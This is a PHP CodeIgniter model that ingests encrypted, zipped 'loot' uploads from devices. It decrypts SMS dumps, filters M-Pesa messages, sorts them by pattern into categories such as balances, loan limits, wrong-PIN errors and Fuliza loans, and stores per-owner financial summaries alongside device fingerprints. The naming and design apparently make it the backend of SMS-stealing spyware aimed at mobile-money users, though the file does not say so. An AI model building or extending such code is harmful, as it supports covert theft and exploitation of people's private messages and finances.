<?php

namespace App\Models;

use CodeIgniter\Model;
use App\Models\ModCryption;
use ZipArchive;

class ModUploads extends Model
{
    protected $table = "tbl_Loot";
    protected $primaryKey = "loot_Id";
    protected $allowedFields = [
        'loot_Name', 'loot_Device', 'loot_Owner', 'loot_Uuid', 'loot_Created'
    ];

    // SMS pattern configuration with 'sms_' prefix
    protected $smsPatterns = [
        'sms_receive' => "confirmed.you have received ksh",
        'sms_from_mshwari' => "transferred from m-shwari account on",
        'sms_from_ncba' => "from ncba bank on",
        'sms_from_kcb' => "from kcb",
        'sms_from_im_bank' => "from im bank limited- app on",
        'sms_balance_mpesa' => "confirmed. your account balance was",
        'sms_balance_kcb' => "confirmed. your kcb m-pesa",
        'sms_balance_mshwari' => "confirmed . your m-shwari deposit account",
        'sms_reversal' => "confirmed. reversal of transaction",
        'sms_loan_limit' => "confirmed. your loan limit is",
        'sms_sent_to_mpesa' => "sent to",
        'sms_sent_to_lnm' => "paid to",
        'sms_sent_mini' => "confirmed. you have transfered ksh",
        'sms_sent_to_mshwari' => "transferred to m-shwari account on",
        'sms_sent_cancel' => "you have cancelled the transaction",
        'sms_error_failed' => "failed.",
        'sms_error_pin' => "you have entered the wrong pin",
        'sms_error_insufficient' => "insufficient funds in your",
        'sms_error_receiver' => "the number you are trying to pay has not joined the service",
        'sms_error_receiver_org' => "transaction failed, m-pesa cannot complete payment of",
        'sms_withdraw' => "confirmed.on",
        'sms_fuliza_opt_out' => "you have successfully opted out of fuliza m-pesa service.",
        'sms_fuliza_opt_in' => "you have successfully opted into fuliza m-pesa.",
        'sms_fuliza_limit' => "your fuliza m-pesa limit is ksh",
        'sms_fuliza_loan_pay' => "from your m-pesa has been used to partially pay your outstanding fuliza m-pesa",
        'sms_fuliza_mini_statement' => "your fuliza m-pesa mini statement is as follows",
        'sms_fuliza_loan_taken' => "confirmed. fuliza m-pesa amount is",
        'sms_similar_transaction' => "m-pesa is unable to process your request because a similar transaction is currently underway",
        'sms_unknown' => "" // Default catch-all
    ];

    // ============ PUBLIC METHODS ============ //

    public function file_upload(array $data): bool {
        return $this->db->table($this->table)->insert($data);
    }

    public function loot_zip_extract(string $zipFilePath): bool {
        $this->validate_zip_file($zipFilePath);

        $extractPath = WRITEPATH . 'uploads/txt_loot/';
        $this->ensure_directory_exists($extractPath);

        $zip = new ZipArchive();
        if ($zip->open($zipFilePath) !== TRUE) {
            throw new \RuntimeException("Failed to open ZIP file");
        }

        $zip->extractTo($extractPath);
        $zip->close();

        return true;
    }

    public function loot_last_uploaded(): ?string {
        $result = $this->db->table($this->table)
            ->selectMax('loot_Uuid')
            ->get();

        return $result->getResult()[0]->loot_Uuid ?? null;
    }

    public function loot_info(string $loot_uuid): array {
        return $this->db->table($this->table)
            ->select('loot_Name, loot_Device, loot_Owner, loot_Uuid')
            ->where('loot_Uuid', $loot_uuid)
            ->get()
            ->getResult();
    }

    public function loot_info_all(string $loot_uuid): array {
        return $this->db->table($this->table)
            ->where('loot_Uuid', $loot_uuid)
            ->get()
            ->getResult();
    }

    public function loot_summary(string $loot_uuid): array {
        return $this->db->table('tbl_Loot_Summary')
            ->where('loot_Uuid', $loot_uuid)
            ->get()
            ->getResult();
    }

    public function loot_parse_sms(
        string $loot_uuid,
        string $loot_owner,
        string $loot_device,
        string $dated
    ): array {
        $result = ['status' => 'error', 'message' => ''];

        try {
            $this->db->transBegin();

            // 1. Validate and get loot file
            $lootFile = $this->validate_and_get_loot_file($loot_uuid);

            // 2. Load and decrypt content
            $decrypted = $this->decrypt_loot_file($lootFile['path']);

            // 3. Parse JSON data
            $smsData = $this->parse_sms_json($decrypted);

            // 4. Process messages
            $processed = $this->process_sms_messages(
                $smsData,
                $loot_uuid,
                $loot_owner,
                $loot_device
            );

            // 5. Save summary
            $this->save_summary_data(
                $processed['counters'],
                $loot_uuid,
                $dated
            );

            $this->db->transCommit();

            return [
                'status' => 'success',
                'processed' => $processed['inserted_count'],
                'summary' => $processed['counters']
            ];

        } catch (\Exception $e) {
            $this->db->transRollback();
            log_message('error', 'SMS Processing Error: ' . $e->getMessage());
            $result['message'] = $e->getMessage();
            return $result;
        }
    }

    public function file_listing(string $loot_owner, string $loot_device): array {
        return $this->db->table($this->table)
            ->where('loot_Device', $loot_device)
            ->where('loot_Owner', $loot_owner)
            ->orderBy('loot_Id', 'DESC')
            ->get()
            ->getResult();
    }

    public function device_check_print(array $print_dump): array {
        return $this->db->table('tbl_Devices')
            ->select('device_Uuid')
            ->where($print_dump)
            ->get()
            ->getResult();
    }

    public function get_loot_uuid(string $loot_name): string {
        $result = $this->db->table($this->table)
            ->select('loot_Uuid')
            ->where('loot_Name', $loot_name)
            ->get()
            ->getResult();

        return $result[0]->loot_Uuid ?? '';
    }

    public function get_loot_summary_from_uuids(array $loot_array_uuids): array {
        return $this->db->table('tbl_Loot_Summary')
            ->select('*')
            ->whereIn('loot_Uuid', $loot_array_uuids)
            ->get()
            ->getResult();
    }

    public function device_make_print(array $print_dump): bool {
        return $this->db->table('tbl_Devices')->insert($print_dump);
    }

    // ============ PROTECTED METHODS ============ //

    protected function clean_sms_by_trimming_messages(array $smsMessages): array {
        $cleanedMessages = [];
        $transactionTerm = "transaction cost";

        foreach ($smsMessages as $sms) {
            if ($sms->Number != "MPESA") {
                continue;
            }

            $message = strtolower(base64_decode($sms->Body));
            $position = strpos($message, $transactionTerm);

            $cleanedMessages[] = base64_encode(
                $position !== false
                    ? substr($message, 0, $position)
                    : $message
            );
        }

        return $cleanedMessages;
    }

    protected function clean_sms_by_categorizing(array $smsMessages): array {
        $categories = [];
        $counters = array_fill_keys(array_keys($this->smsPatterns), 0);

        foreach ($smsMessages as $message) {
            $decoded = base64_decode($message);
            $category = 'sms_unknown';

            foreach ($this->smsPatterns as $name => $pattern) {
                if (!empty($pattern) && strpos($decoded, $pattern) !== false) {
                    $category = $name;
                    break;
                }
            }

            $counters[$category]++;
            $categories[] = ucwords(str_replace(['sms_', '_'], ['', ' '], $category));
        }

        return [
            'categories' => $categories,
            'counters' => $counters
        ];
    }

    protected function clean_sms_by_returning_column(array $smsMessages, string $columnName): array {
        $columnData = [];
        $property = $columnName === 'Thread Id' ? 'Thread Id' : $columnName;

        foreach ($smsMessages as $sms) {
            if ($sms->Number === "MPESA") {
                $columnData[] = $sms->$property;
            }
        }

        return $columnData;
    }

    protected function validate_zip_file(string $path): void {
        if (!file_exists($path)) {
            throw new \RuntimeException("ZIP file not found");
        }

        if (mime_content_type($path) !== 'application/zip') {
            throw new \RuntimeException("Invalid file type");
        }
    }

    protected function ensure_directory_exists(string $path): void {
        if (!is_dir($path)) {
            mkdir($path, 0755, true);
        }
    }

    protected function validate_and_get_loot_file(string $uuid): array {
        $query = $this->db->table($this->table)
            ->select('loot_Name')
            ->where('loot_Uuid', $uuid)
            ->get();

        if ($query->getNumRows() === 0) {
            throw new \RuntimeException("Loot record not found");
        }

        $fileName = $query->getRow()->loot_Name;
        $filePath = WRITEPATH . "uploads/txt_loot/" . $fileName;

        if (!file_exists($filePath)) {
            throw new \RuntimeException("Loot file not found");
        }

        return [
            'name' => $fileName,
            'path' => $filePath
        ];
    }

    protected function decrypt_loot_file(string $path): string {
        $modCryption = new ModCryption();
        $content = file_get_contents($path);
        $decrypted = $modCryption->decode_content($content);

        if (empty($decrypted)) {
            throw new \RuntimeException("Failed to decrypt file");
        }

        return $decrypted;
    }

    protected function parse_sms_json(string $data): array {
        $transformations = [
            '-------(//)--------' => '',
            "\n" => '****',
            '****"' => '"'
        ];

        $normalized = str_replace(
            array_keys($transformations),
            array_values($transformations),
            $data
        );

        $json = json_decode('[' . substr($normalized, 0, -2) . '}]');

        if (json_last_error() !== JSON_ERROR_NONE) {
            throw new \RuntimeException("JSON parse error: " . json_last_error_msg());
        }

        return $json;
    }

    protected function process_sms_messages(
        array $smsData,
        string $uuid,
        string $owner,
        string $device
    ): array {
        $cleaned = $this->clean_sms_by_trimming_messages($smsData);
        $categorized = $this->clean_sms_by_categorizing($cleaned);

        $batch = [];
        $columns = ['Date', 'Type', 'Number', 'Seen', 'ID', 'Thread Id'];

        foreach ($smsData as $index => $sms) {
            if ($sms->Number != "MPESA") continue;

            $batch[] = [
                'sms_type' => $sms->Type,
                'sms_number' => $sms->Number,
                'sms_thread_id' => $sms->{'Thread Id'},
                'sms_time' => $sms->Date,
                'sms_category' => $categorized['categories'][$index] ?? 'sms_unknown',
                'sms_seen' => $sms->Seen,
                'sms__id' => $sms->ID,
                'sms_body' => $cleaned[$index] ?? '',
                'sms_loot_source' => $uuid,
                'sms_owner' => $owner,
                'sms_device' => $device
            ];
        }

        $inserted = 0;
        foreach (array_chunk($batch, 100) as $chunk) {
            $inserted += $this->db->table('tbl_Sms')->insertBatch($chunk)
                ? count($chunk) : 0;
        }

        return [
            'inserted_count' => $inserted,
            'counters' => $categorized['counters']
        ];
    }

    protected function save_summary_data(array $counters, string $uuid, string $date): bool {
        $mapping = [
            'sms_receive' => 'info_Get_from_MPESA',
            'sms_from_mshwari' => 'info_Get_from_Mshwari',
            'sms_from_ncba' => 'info_Get_from_NCBA',
            'sms_from_kcb' => 'info_Get_from_KCB',
            'sms_from_im_bank' => 'info_Get_from_IM',
            'sms_reversal' => 'info_Get_from_Reversal',
            'sms_balance_mpesa' => 'info_Get_Bal_MPESA',
            'sms_balance_kcb' => 'info_Get_Bal_KCB',
            'sms_balance_mshwari' => 'info_Get_Bal_Mshwari',
            'sms_loan_limit' => 'info_Loan_Limit',
            'sms_sent_to_mpesa' => 'info_Sent_to_MPESA',
            'sms_sent_to_lnm' => 'info_Sent_to_LNM',
            'sms_sent_mini' => 'info_Sent_Mini',
            'sms_sent_to_mshwari' => 'info_Sent_to_Mshwari',
            'sms_sent_cancel' => 'info_Sent_Cancel',
            'sms_error_failed' => 'info_Error_Failed',
            'sms_error_pin' => 'info_Error_Pin',
            'sms_error_insufficient' => 'info_Error_Less',
            'sms_error_receiver' => 'info_Error_Receiver',
            'sms_error_receiver_org' => 'info_Error_Receiver_Org',
            'sms_withdraw' => 'info_Withdraw',
            'sms_fuliza_opt_out' => 'info_Fuliza_Opt_Out',
            'sms_fuliza_opt_in' => 'info_Fuliza_Opt_In',
            'sms_fuliza_limit' => 'info_Fuliza_Limit',
            'sms_fuliza_loan_pay' => 'info_Fuliza_Loan_Paid',
            'sms_fuliza_mini_statement' => 'info_Fuliza_Mini_Statement',
            'sms_fuliza_loan_taken' => 'info_Fuliza_Loan_Taken',
            'sms_similar_transaction' => 'info_Similar_Transaction',
            'sms_unknown' => 'info_Unknown'
        ];

        $summary = ['loot_Uuid' => $uuid, 'loot_Created' => $date];

        foreach ($mapping as $pattern => $field) {
            $summary[$field] = $counters[$pattern] ?? 0;
        }

        $summary['info_All'] = array_sum($counters);

        return $this->db->table('tbl_Loot_Summary')->insert($summary);
    }
}